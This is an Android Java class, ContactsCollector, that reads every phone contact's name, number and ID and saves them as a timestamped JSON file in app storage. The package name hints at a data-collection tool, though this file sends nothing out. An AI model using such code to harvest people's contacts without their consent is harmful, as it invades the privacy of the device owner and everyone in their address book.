package com.alzahra.collector;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;

public class ContactsCollector {
    private static final String TAG = "ContactsCollector";
    private final Context context;

    public ContactsCollector(Context context) { this.context = context; }

    public File export() {
        try {
            JSONArray contactsList = new JSONArray();
            ContentResolver resolver = context.getContentResolver();
            Cursor cursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.CONTACT_ID},
                null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            if (cursor == null) return null;
            try {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(0));
                    contact.put("number", cursor.getString(1));
                    contact.put("contact_id", cursor.getString(2));
                    contactsList.put(contact);
                }
            } finally { cursor.close(); }
            if (contactsList.length() == 0) return null;
            File dir = new File(context.getFilesDir(), "exports");
            if (!dir.exists()) dir.mkdirs();
            File file = new File(dir, "contacts_" + System.currentTimeMillis() + ".json");
            FileWriter writer = new FileWriter(file);
            writer.write(contactsList.toString(2));
            writer.close();
            Log.d(TAG, "Contacts exported: " + contactsList.length());
            return file;
        } catch (Exception e) { Log.e(TAG, "Contacts export error", e); return null; }
    }
}
